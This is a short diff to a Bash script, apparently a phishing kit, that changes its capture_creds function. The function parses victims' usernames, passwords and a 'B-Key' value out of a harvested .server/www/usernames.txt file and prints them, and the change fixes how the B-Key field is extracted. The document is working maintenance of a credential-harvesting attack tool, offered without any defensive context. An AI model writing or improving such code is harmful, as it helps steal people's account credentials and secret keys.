@@ -420,10 +420,10 @@ capture_ip() {
 
 ## Get credentials
 capture_creds() {
-	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
+    	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
     	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F "Pass: " '{print $2}' | awk '{print $1}')
-    	BKEY=$(grep -o 'B-Key:.*' .server/www/usernames.txt | awk '{print $2}')
-     
+    	BKEY=$(grep -o 'B-Key:.*' .server/www/usernames.txt | awk -F "B-Key: " '{print $2}' | awk '{print $1}')
+         
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
     	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
